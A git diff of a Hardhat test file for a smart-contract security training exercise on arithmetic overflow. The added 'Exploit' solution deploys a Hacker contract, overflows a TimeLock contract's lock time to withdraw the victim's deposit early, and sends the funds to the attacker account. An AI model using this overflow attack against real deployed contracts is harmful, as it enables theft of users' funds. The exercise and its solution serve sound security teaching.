@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const BigNumber = ethers.BigNumber;
 
 describe('Arithmetic Over/Underflow Exercise 1', function () {
 
@@ -15,12 +16,14 @@ describe('Arithmetic Over/Underflow Exercise 1', function () {
         this.victimInitialBalance = await ethers.provider.getBalance(victim.address)
 
         const TimeLockFactory = await ethers.getContractFactory(
-            'contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock', 
+            'contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock',
             deployer
         );
 
         this.timelock = await TimeLockFactory.deploy();
-        
+
+
+
         await this.timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
         let currentBalance = await ethers.provider.getBalance(victim.address);
         expect(currentBalance).to.be.lt(this.victimInitialBalance.sub(VICTIM_DEPOSIT))
@@ -36,12 +39,27 @@ describe('Arithmetic Over/Underflow Exercise 1', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
-        
+        const Hackerfactory = await ethers.getContractFactory(
+            'contracts/arithmetic-overflows-1/TimeLock.sol:Hacker',
+            attacker
+        );
+
+        this.hacker = await Hackerfactory.deploy(this.timelock.address);
+
+        this.attackNumber = BigNumber.from((await this.hacker.connect(victim).removeTimeLock()).toString())
+        await this.timelock.connect(victim).increaseMyLockTime(this.attackNumber.add(1))
+        await this.timelock.connect(victim).withdrawETH();
+        this.victimeBalance = (await ethers.provider.getBalance(victim.address)).sub(ethers.utils.parseEther("0.0001"));
+        await victim.sendTransaction({ to: attacker.address, value: this.victimeBalance });
+
+
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
         let victimDepositedAfter = await this.timelock.connect(victim).getBalance(victim.address);
         expect(victimDepositedAfter).to.equal(0);
